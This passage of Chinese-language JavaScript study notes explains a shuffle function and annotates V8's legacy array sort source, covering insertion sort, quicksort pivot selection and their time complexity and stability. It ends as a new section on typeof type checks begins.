		    var j, x, i;
		    for (i = a.length; i; i--) {
			j = Math.floor(Math.random() * i);
			x = a[i - 1];/*可以用es6哦*/
			a[i - 1] = a[j];
			a[j] = x;
		    }
		    return a;
		}
	简化为：[a[i - 1], a[j]] = [a[j], a[i - 1]]




十五：Js V8 排序源码

       简易原理：当数组长度小于等于 10 时 -> 插入排序
        	大于 10 的时候 -> 快速排序 (并不严谨)
       
	1. 插入排序
	源码：
	
		  /**
		   * @param {待排序序列的起始和终止位置} from/to
		   * 
		   * @variable {待插入元素} i 
		   * @variable {指向待插入元素前一位置指针} j
		   */
		  function InsertionSort(a, from, to) {
		    for (var i = from + 1; i < to; i++) {
		      var ele = a[i];
		      for (var j = i - 1; j >= from; j--) {
			var tmp = a[j];
			/*
			  var order = comparefn(tmp, ele)
			  源码中可以传入比较函数
			 */
			var order = tmp - ele
			if (order > 0) {
			  a[j + 1] = tmp;
			} else {
			  break;
			}
		      }
		      a[j + 1] = ele;
		    }
		  };
			
			
	  (1) 时间复杂度
	      最好情况：数组升序排列：O(n)
	      最坏情况：数组降序排列：O(n²)「1+2+..+n」
	  
	  (2) 稳定算法: 元素排序后还保持相同的位置
	  
	  (3) 优势
	  a. 排序状态好 b. 问题规模较小时，使用插入排序效率更高
	  
	
	2. 快速排序
	  
	  (1) 时间复杂度「与基准的选择密切相关呐」
	      每次递归都需要交换：O(n)
	      
	      最好情况：O(nlogn)
	      	1递归深度：假设每次基准都可以平分数组「每次递归规模/2」 -> 假设数组有 n 个元素，其递归的深度就为 log2n + 1
	      最坏情况：O(n²)
	      	递归深度：O(n)「排序好的数组，每次都有一个分部为空，等于每次递归规模-1」
		
	  
	  (2) 不稳定算法: 只有小于基准的才会排在基准前「等于基准的被交换到后边」
	  
	  (3) v8 基准的选择
	  
	    v8 选择基准的原理是从头和尾之外再选择一个元素，然后三个值排序取中间值。


		a. 当数组长度大于 10 但是小于 1000 的时候，取中间位置的元素，实现代码为：

		// 基准的下标
		third_index = from + ((to - from) >> 1); /*>> 1 相当于除以 2 (忽略余数)*/
		
		b. 当数组长度大于 1000 的时候，每隔 200 ~ 215 个元素取一个值，然后将这些值进行排序，取中间值的下标，实现的代码为：

		// 简单处理过
		function GetThirdIndex(a, from, to) {
		    var t_array = new Array();
		    /*
		      15 的二进制为： 1111「任何和 15 按位与的结果都会小于或者等于 15」
		      实现了每隔 200 ~ 215 个元素取一个值
		     */
		    var increment = 200 + ((to - from) & 15);

		    var j = 0;
		    from += 1;
		    to -= 1;

		    for (var i = from; i < to; i += increment) {
			t_array[j] = [i, a[i]];
			j++;
		    }
		    // 对随机挑选的这些值进行排序
		    t_array.sort(function(a, b) {
			return comparefn(a[1], b[1]);
		    });
		    // 取中间值的下标
		    var third_index = t_array[t_array.length >> 1][0];
		    return third_index;
		}
		
	   
	   V8 源码：「重要!!!」
	   
		function QuickSort(a, from, to) {
		  /*1.选取第三个元素*/
		  var third_index = 0; 
		  while (true) {
		      if (to - from <= 10) {  // 取中间元素的位置
			  InsertionSort(a, from, to);
			  return;
		      }
		      if (to - from > 1000) {
			  third_index = GetThirdIndex(a, from, to); // 位运算, 每隔200~215个元素取值
		      } else {
			  third_index = from + ((to - from) >> 1);
		      }
		      
		      /*2.三个值进行排序*/
		      var v0 = a[from];
		      var v1 = a[to - 1];
		      var v2 = a[third_index];

		      var c01 = comparefn(v0, v1);
		      if (c01 > 0) {
			  var tmp = v0;
			  v0 = v1;
			  v1 = tmp;
		      } // v0 <= v1.
		      var c02 = comparefn(v0, v2);
		      if (c02 >= 0) {
			  var tmp = v0;
			  v0 = v2;
			  v2 = v1;
			  v1 = tmp;
		      } else {
			  var c12 = comparefn(v1, v2);
			  if (c12 > 0) {
			      // v0 <= v2 < v1
			      var tmp = v1;
			      v1 = v2;
			      v2 = tmp;
			  }
		      }

		      /*
			根据排序结果交换数组元素
			基准为排序中间值
		       */
		      a[from] = v0; 
		      a[to - 1] = v2;
		      var pivot = v1;

		      var low_end = from + 1;
		      var high_start = to - 1;

		      /*
			pivot 与第二个元素交换(选取基准时已经排序过一次 => a[pivot] > a[from])
			前两个元素已经有序，只需要将小于 pivot 元素交换到 pivot 前边即可
		       */
		      a[third_index] = a[low_end];
		      a[low_end] = pivot;

		      /**
		       * low_end: 基准所在位置
		       * high_start: 倒序查找位置
		       */
		      partition: for (var i = low_end + 1; i < high_start; i++) {
			  var ele = a[i]; 
			  var order = comparefn(ele, pivot); // 将比基准小的全部移到基准前 [ 第二个元素 ]
			  if (order < 0) {
			      a[i] = a[low_end]; /*交换基准与较小元素*/
			      a[low_end] = ele;
			      low_end++;
			  } else if (order > 0) {
			      do { /*倒序查找到第一个小于 pivot 元素为止*/
				  high_start--; 

				  if (high_start == i) /*查找到基准所在位置, 数组已有序*/
				    break partition;

				  var top_elem = a[high_start]; 
				  order = comparefn(top_elem, pivot);
			      } while (order > 0);

			      /*交换较大与较小元素*/
			      a[i] = a[high_start]; 
			      a[high_start] = ele; 

			      if (order < 0) { /*此时a[i]变成了较小元素, 与pivot进行交换, 基准指针后移*/
				  ele = a[i];
				  a[i] = a[low_end];
				  a[low_end] = ele;
				  low_end++;
			      }
			  }
		      }
		      if (to - high_start < low_end - from) {
			  QuickSort(a, high_start, to);
			  to = low_end;
		      } else {
			  QuickSort(a, from, low_end);
			  from = high_start;
		      }
		  }
		}
		
		




	
    1. 基本类型判断函数封装
    typeof
      ├── primitive
      |── 'object' | 'function'
